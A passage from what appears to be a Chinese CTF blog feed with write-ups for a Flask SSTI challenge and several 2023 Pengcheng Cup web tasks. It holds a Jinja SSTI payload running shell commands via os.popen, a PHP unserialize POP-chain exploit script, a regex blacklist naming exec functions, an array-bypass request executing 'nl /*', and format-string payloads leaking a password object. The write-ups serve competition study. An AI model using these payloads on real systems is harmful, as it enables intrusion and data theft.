class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算...</span></span><br><span class="line">    <span class="comment"># 通过计算...</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>username payload:</p><ol><li>先fuzz一下吧，可以通过脚本fuzz来着，或者直接打payload，过了就过了，覆写黑白名单也不是不行，但是这里没法试一试也没有具体信息</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">cmd=cmd.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">payload=<span class="string">f&#x27;&#x27;&#x27;&#123;&#123;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(bytes.fromhex(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).decode()).read()&quot;)&#125;&#125;&#125;&#125;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="一些Tricks"><a href="#一些Tricks" class="headerlink" title="一些Tricks"></a>一些Tricks</h2><ol><li>对于<strong>重复定义函数绕过黑白名单</strong>的情况<ol><li>要注意函数的定义前后解析情况，路由外部定义的全局还是路由函数内部定义的，如果是路由内定义估计无法覆盖</li></ol></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>最重要的一句话：你别急，状态是最重要的，<em><strong>多思考</strong></em></li><li>fileread<ol><li>脚本慢慢看，查阅资料还是树状比较好，<em><strong>不会先思考再查</strong></em></li><li><em><strong>每一个切入点都很重要</strong></em>，需要rce，又file_get_contents就可以查php file_get_contents rce</li></ol></li><li>notadmin<ol><li>目的导向式的寻找切入点，<em><strong>从sink出发</strong></em></li><li>本地测测打不打得通!逻辑判断比如code污染的类推，<em><strong>开发有测试驱动，安全则是poc和res驱动，能快还是快，不能快还是要poc，晕也要poc</strong></em></li><li>思路可以跳脱一点，像黑名单这种可以看看能不能暴力覆盖或者直接跳过，<em><strong>要绕很久一般，覆盖只要一会，想一想</strong></em><ol><li>覆盖函数用到的思想是<strong>函数也是对象</strong>，通过后赋值指向别的地址来实现</li></ol></li></ol></li><li>python口算<ol><li><em><strong>找入口点</strong></em>：特征&#x2F;现象-&gt;可能原理&#x2F;唯一入口</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹏城杯23</title>
      <link href="/2024/11/08/%E9%B9%8F%E5%9F%8E%E6%9D%AF23/"/>
      <url>/2024/11/08/%E9%B9%8F%E5%9F%8E%E6%9D%AF23/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.yuque.com/dat0u/ctf">感谢ctf复现计划</a></p></blockquote><h2 id="web01-php-pop链"><a href="#web01-php-pop链" class="headerlink" title="web01: php pop链"></a>web01: php pop链</h2><ol><li><p>源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hacker-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;finish-&gt;<span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$parms1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$parms1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hacker-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome~ &quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;method,<span class="variable">$this</span>-&gt;args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nonono</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">nonono</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>一眼pop链，得加速了，等下应该开很多人</p></li><li><p>过滤系统函数，字符串变少，过滤直接&#96;反引号绕过</p></li><li><p>调用链</p><ol><li><p>直接H-&gt;Hacker不久可以读到&#x2F;flag文件，感觉是假的flag，但是还是要试一试，居然是真flag，也是不会爆0了</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实测可以调用到call_usr_function()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome~ &quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$exp</span> -&gt; username = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="web02-php-scandir-和"><a href="#web02-php-scandir-和" class="headerlink" title="web02: php scandir 和 []"></a>web02: php scandir 和 []</h2><ol><li><p>源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="variable">$title</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)&gt;<span class="number">5</span>||<span class="title function_ invoke__">strlen</span>(<span class="variable">$title</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="variable">$title</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$title</span>)) &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ctrl+u源码，看到scandir()</p></li><li><p>同时给出提示<code>backdoor_[a-f0-9]&#123;16&#125;\.php</code></p></li><li><p>我刚学的通配符用上了: <code>scandir(&quot;glob://backdoor_[a-f0-9]*.php&quot;)</code></p></li><li><p>爆破出后门然后看看内容</p></li><li><p>php代码执行，目测数组绕过，存到Array里</p><ol><li>在<code>file_put_contents()</code>的时候数组转换是为空吗，但是这里有先字符串，所以还是Array文件</li><li>在<code>file_get_contents()</code>中数组并没有直接转成字符串，为空，判断符合，直接一套带走</li></ol></li><li><p>如果这里strlen无法绕过，可以考虑竞争一下，感觉可行，因为文件名是同一个</p></li><li><p>exp: wp中直接绕过<code>?username=exp&amp;title[]=123&amp;data[]=&lt;?=`nl+/*`;</code>刚好10个字符</p></li></ol><h2 id="escape-python-format-ssti"><a href="#escape-python-format-ssti" class="headerlink" title="escape: python format ssti"></a>escape: python format ssti</h2><blockquote><p>逆天原题杯 Helpful: [<a href="https://imaginaryctf.org/ArchivedChallenges/39]">https://imaginaryctf.org/ArchivedChallenges/39]</a></p></blockquote><ol><li><p><code>/source</code>源码路由</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlite3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app=app,</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">    default_limits=[<span class="string">&quot;50000 per hour&quot;</span>],</span><br><span class="line">    storage_uri=<span class="string">&quot;memory://&quot;</span>,    <span class="comment"># 在内存中设置</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&#x27;****************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PassHash</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con = connect(<span class="string">&quot;users.db&quot;</span>)</span><br><span class="line">cur = con.cursor()</span><br><span class="line">cur.execute(<span class="string">&quot;DROP TABLE IF EXISTS users&quot;</span>)</span><br><span class="line">cur.execute(<span class="string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)</span><br><span class="line">passhash = PassHash(<span class="string">&#x27;&#x27;</span>.join(choice(<span class="string">&quot;0123456789&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)))</span><br><span class="line">cur.execute(</span><br><span class="line">    <span class="string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,</span><br><span class="line">    (<span class="string">&quot;admin&quot;</span>, <span class="built_in">str</span>(passhash))</span><br><span class="line">)</span><br><span class="line">con.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/second&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;3/second&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = request.args[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        new_pwd = PassHash(request.args[<span class="string">&quot;password&quot;</span>])</span><br><span class="line">        con = connect(<span class="string">&quot;users.db&quot;</span>)</span><br><span class="line">        cur = con.cursor()</span><br><span class="line">        res = cur.execute(</span><br><span class="line">            <span class="string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,</span><br><span class="line">            (username, <span class="built_in">str</span>(new_pwd))</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> res.fetchone():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;secret.html&quot;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span></span><br><span class="line">                .<span class="built_in">format</span>(user=username)</span><br><span class="line">                .<span class="built_in">format</span>(passhash=new_pwd)</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span>)</span><br></pre></td></tr></table></figure></li><li><p>参数化查询，无法sql注入</p></li><li><p>目的是要获取secret.html的内容，登录成功即可，无需注意admin，注意到<code>__file__</code>&#x2F;<code>index.html</code>是可以读的，是否需要后续写入？</p></li><li><p>好像没有得注册，注意到admin的passhash在全局变量中</p></li><li><p>如果没有获取文件，则在passhash处ssti?(格式字符串漏洞)获取passhash这个变量，而且这里没有过滤 -&gt; <strong>思路对了</strong>，但是flask ssti不熟sad，看题解 –&gt; <strong>没有环境本地复现不了啊，本地python跑出来不一样啊，还是学思路就好</strong></p></li><li><p>可以知道密码保存在全局的passhash对象中，利用字符串显示方法来获取</p><ol><li><p>PassHash 虽然继承了 str, 但是只重写了 <code>__str__</code> 和 <code>__repr__</code> 两个方法, 实例化时传入的 password 明文其实还保存在对象里面，要通过其他方法获取对象</p></li><li><p><strong>format获取明文</strong>:<code>username=&#123;passhash.__class__.__str__.__globals__[passhash]:&gt;0&#125;&amp;password=2</code>: <code>:&gt;0</code> 表示左对齐, 会调用父类 str 的 <code>__format__</code> 方法, 而不是 <code>__str__</code> 和 <code>__repr__</code>, 进而得到明文</p></li><li><p><strong>爆破获取明文</strong>:<code>username=&#123;passhash.__class__.__str__.__globals__[passhash][0]&#125;&amp;password=2</code></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 